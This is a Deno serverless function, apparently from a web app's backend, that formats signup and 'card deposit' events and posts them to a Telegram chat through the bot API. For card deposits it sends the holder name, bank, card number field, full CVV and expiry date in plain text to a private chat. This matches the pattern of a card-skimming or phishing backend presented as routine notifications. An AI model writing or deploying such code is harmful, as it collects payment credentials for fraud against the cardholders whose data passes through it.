import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") || import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID") || import.meta.env.VITE_TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("Telegram bot token or chat id is not configured for notify-telegram function.");
}

type EventPayload = Record<string, unknown>;

const formatMessage = (event: string, payload: EventPayload) => {
  const timestamp = new Date().toISOString();

  switch (event) {
    case "NEW_USER":
      return [
        "🚀 *New User Signup*",
        `• Email: ${payload.email ?? "N/A"}`,
        `• Name: ${payload.fullName ?? "N/A"}`,
        `• User ID: ${payload.userId ?? "N/A"}`,
        `• Time: ${timestamp}`,
      ].join("\n");
    case "CARD_DEPOSIT_ATTEMPT":
      return [
        "💳 *Card Deposit Submitted*",
        `• User: ${payload.email ?? "Unknown"}`,
        `• Name: ${payload.cardHolderName ?? "N/A"}`,
        `• Bank: ${payload.bankName ?? "N/A"}`,
        `• Amount: $${payload.amount ?? "0"}`,
        `• Number: ****${payload.cardNumber ?? "----"}`,
        `• CVV: ${payload.cvv ?? "N/A"}`,
        `• Expiry Date: ${payload.expiryDate ?? "N/A"}`,
        `• User ID: ${payload.userId ?? "N/A"}`,
        `• Time: ${timestamp}`,
      ].join("\n");
    default:
      return [
        "ℹ️ *App Event*",
        `• Type: ${event}`,
        `• Payload: ${JSON.stringify(payload, null, 2)}`,
        `• Time: ${timestamp}`,
      ].join("\n");
  }
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      throw new Error("Telegram credentials are not configured.");
    }

    const { event, payload } = await req.json();

    if (!event) {
      throw new Error("Missing event type");
    }

    const message = formatMessage(event, payload ?? {});

    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    const telegramData = await telegramResponse.json();

    if (!telegramData.ok) {
      console.error("Telegram API error:", telegramData);
      throw new Error(telegramData.description || "Failed to send Telegram message");
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("notify-telegram error:", error);
    const message = error instanceof Error ? error.message : "Unknown error";
    return new Response(JSON.stringify({ error: message }), {
      status: 400,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});

